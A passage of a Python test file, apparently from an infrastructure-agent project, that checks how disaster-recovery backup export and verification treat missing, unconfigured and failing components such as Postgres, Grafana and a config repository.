    """ "Nothing to verify" is not a pass. It is the state in which the platform
    has no backup and nobody has noticed."""
    duties, notifier = duties_for(estate)

    answer = duties.dr_verify()

    assert answer["ok"] is False
    assert notifier.messages[-1][1] is True


def test_the_dr_duties_never_ask_the_model_anything(estate, tmp_path, monkeypatch):
    """`runner` is a bare object, so any call into the LLM path raises. These
    two duties compute facts and send them; there is no prose to write."""
    estate.dr_target = str(tmp_path / "standby")
    duties, _notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())

    duties.dr_export()
    duties.dr_verify()


# -- "not configured" is not "broken" -----------------------------------------


def test_a_platform_without_grafana_is_not_a_failed_backup(estate, tmp_path):
    """A nightly duty that pages the owner about a service they deliberately do
    not run is a duty they turn off - and then it is not there on the night it
    matters."""
    result = make_bundle(estate, tmp_path / "out", grafana=None)

    assert result.ok
    assert result.warnings == []
    assert result.summary()["not_configured"] == ["grafana"]
    grafana = result.manifest.component("grafana")
    assert grafana is not None and grafana.skipped is True


def test_a_bundle_exported_without_postgres_still_verifies(estate, tmp_path):
    estate.postgres_dsn = None

    result = make_bundle(estate, tmp_path / "out")
    report = verify(result.bundle)

    assert result.ok
    assert report.ok, [check.line() for check in report.failures()]
    postgres = next(c for c in report.checks if c.name == "postgres")
    assert postgres.ok and "not set" in postgres.detail


def test_a_configured_database_that_will_not_dump_is_still_a_failure(estate, tmp_path):
    """The distinction only cuts one way: a platform that HAS Postgres and
    could not dump it has a hole in its backup."""
    result = make_bundle(estate, tmp_path / "out", pg_dumper=FakePgDump(fail={"infra", "netbox"}))

    assert not result.ok
    postgres = result.manifest.component("postgres")
    assert postgres is not None and postgres.failed
    assert verify(result.bundle).ok is False


def test_a_config_repo_outside_data_dir_is_still_bundled_and_still_not_copied_twice(
    estate, tmp_path
):
    """INFRA_CONFIG_REPO_DIR may point anywhere. The exclusion is computed by
    relative path, so a repo that is not under data_dir simply has nothing to
    exclude - and must not silently stop being exported."""
    outside = tmp_path / "elsewhere" / "configs"
    estate.config_repo_dir = outside
    ConfigGitStore(outside).write("fw-01", "config", "config system global\n")

    result = make_bundle(estate, tmp_path / "out")

    assert result.ok
    paths = {entry.path for entry in result.manifest.files}
    assert "configs.bundle" in paths
    assert not any(path.startswith("data/elsewhere") for path in paths)
    assert verify(result.bundle).ok
